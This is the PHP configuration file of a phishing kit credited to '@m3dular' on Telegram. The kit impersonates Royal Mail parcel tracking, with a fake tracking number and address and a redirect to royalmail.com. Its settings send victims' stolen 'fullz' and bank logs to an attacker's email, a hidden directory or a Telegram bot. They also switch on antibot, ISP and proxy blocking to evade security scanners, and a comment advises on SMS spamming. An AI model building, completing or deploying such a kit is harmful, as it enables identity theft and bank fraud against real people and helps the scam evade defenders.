<?php

/*

--------------------------------
VERSION 1.2 
MOBILE ONLY CONTROLS
----------------------------

VERSION 1.3
SAVE LOGS
----------------------------




 ████╗░████║╚════██╗██╔══██╗██║░░░██║██║░░░░░██╔══██╗██╔══██╗
██╔████╔██║░█████╔╝██║░░██║██║░░░██║██║░░░░░███████║██████╔╝
██║╚██╔╝██║░╚═══██╗██║░░██║██║░░░██║██║░░░░░██╔══██║██╔══██╗
██║░╚═╝░██║██████╔╝██████╔╝╚██████╔╝███████╗██║░░██║██║░░██║
╚═╝░░░░░╚═╝╚═════╝░╚═════╝░░╚═════╝░╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝



Built by @m3dular  On TELEGRAM

PAGES V3

MAJOR ANTIBOT UPGRADES
PROXY BLOCK ADDITION
TELEGRAM CHANNEL RESULTS
MORE ANTICRAWLER TRAPS AND TEST

------------------------------------
------------------------------------
*/


// 1 IS ON or 0 IS OFF

$EMAIL= "drkwabena@protonmail.com"; // EMAIL RESULT WOULD BE SENT TO
$OWNER ="ataraxia"; // THIS NAME WILL SHOW UP IN THE RESULTS AS FULLZ OWNER


$BANKLOG=0; // DISABLE OR ENABLE BANK LOGS
$SAVEFULLZ=0; // SAVE FULLZ
$SAVEFULLZDIRECTORY="az"; // USE A RANDOM NAME NO ONE CAN GUESS FULLZ WILL BE SAVED HERE


// ---------- ANTIBOT / PROXY CONTROLS -----------
$ANTIBOTPW=1; 
$ISPBLOCK=1; 
$PROXYBLOCK=0; 
$STATICANTIBOT=1; 
$M3DBLOCK=1; 
// ---------- ANTIBOT / PROXY CONTROLS -----------



// ---------- REQUESTED  CONTROL -----------

$TRACKINGNUMBER="LJ220837544US";
$DATE="25/04/2020";
$ADDRESS="Unit 9,
Rosemount Business Park Dublin D11 X8PX.";

// ---------- REQUESTED  CONTROL -----------








$REDIRECT="https://royalmail.com"; 
$TIMEOUT="5000";

// ---------- DEVICE CONTROL -----------

$MOBILE_ALLOWED=1;
$DESKTOP_ALLOWED=1; // IF SPAMMING SMS TURN DESKTOP OFF! COULD HELP PAGE LAST LONGER!

//---------------------------------------

//------------ TELEGRAM CONTROLS -------------
$TELEGRAM=0; // IF YOU NEED RESULTS SENT TO YOUR TG ACCOUNT CONTACT ME @m3dular on TG  ADD YOUR BOT TO CHANNEL, MAKE IT ADMIN, INPUT CREDENTIALS HERE.
$TELEGRAMCHANNELID="";
$TELEGRAMBOTTOKEN="";
//-----------------------------------


//------------ SAVE TO DISK ---------
$SAVELOG=0;

/* M3DULAR DEBUG LINE*/
$DEBUG=0; 

?>